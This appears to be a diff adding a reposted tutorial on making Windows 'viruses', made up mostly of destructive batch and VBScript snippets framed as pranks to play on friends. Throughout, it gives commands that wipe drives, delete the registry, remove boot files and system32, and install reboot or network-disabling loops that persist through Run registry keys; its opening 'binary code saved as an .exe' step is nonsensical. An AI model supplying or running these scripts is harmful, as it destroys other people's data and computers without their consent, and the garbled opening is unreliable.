@@ -1,0 +1,129 @@
+How To Create Virus To Format Hard Drive ?
+1. Copy the below codes into Notepad.
+
+01001011000111110010010101010101010000011111100000
+
+
+2. Save the file as Format.exe
+3. You just created virus to format Hard Drive. Enjoy !!!
+_________________________________________________________________________________
+
+MAKE OTHER VIRUSES IN A MINUTE:
+
+@echo off
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
+
+Save As “Your File Name.bat [Batch File]
+
+Registry Deleter
+
+Deletes everything stored in registry
+
+@echo OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+
+No Access
+
+A good Halloween prank for your friends this stops internet access of the user. To gain Access type IPconfig /renew in CMD
+
+@echo off
+Ipconfig /release
+
+Shut Up
+
+Send your friend a little message and shut down his computer
+
+@echo off
+msg * Lets Roll Baby
+shutdown -c “Error! Your ass got glued!” -s
+
+Crash Puter
+
+This is simple virus that crashes the computer – [Save As Anything.VBS]
+
+Option Explicit
+
+Dim WSHShell
+Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+
+Dim x
+For x = 1 to 100000000
+WSHShell.Run “Tourstart.exe”
+Next
+
+Ez Formatter
+
+This Simple Virus formats windows drives in less than 5 seconds. Only D,E And C drives.
+
+rd/s/q D:\
+rd/s/q C:\
+rd/s/q E:\
+
+Shutter
+
+This virus can be very annoying it shutdowns computer every time the computer is turned on.
+
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
+echo You Are Nailed, Buy A New Computer This Is Piece Of Shit.
+PAUSE
+
+Now its time for few very dangerous viruses
+
+Rest In Peace
+
+It crashes PC once used the PC can’t be restarted.. It deletes everything necessary for starting up windows. Do not use on yourself .
+
+@echo off
+attrib -r -s -h c:\autoexec.bat
+del c:\autoexec.bat
+attrib -r -s -h c:\boot.ini
+del c:\boot.ini
+attrib -r -s -h c:\ntldr
+del c:\ntldr
+attrib -r -s -h c:\windows\win.ini
+del c:\windows\win.ini
+
+Century
+
+Shut downs the PC hundred times. To stop Start Run and type shutdown -a . You can also change the times pc restarts by replacing 100 by your choice.
+
+Create a new shortcut and type :-
+
+shutdown -s -t 100 c “Installing Updates”
+
+RIP -2
+
+This virus does the same It also prevents pc from starting but in an effective and better way.
+
+del c:\WINDOWS\system32\*.*/q
+
+Freak
+
+This virus disables the internet forever
+
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo You have maxed your internet usage for a lifetime ??
+PAUSE
+
+
+Now there are some smart guys who check the batch files in notepad before running it. No big deal. An effective way .
+
+Warning: Please don't try to run on your own computer or else it will delete all the content of your C Drive. I will not be responsible for any damage done to your computer.
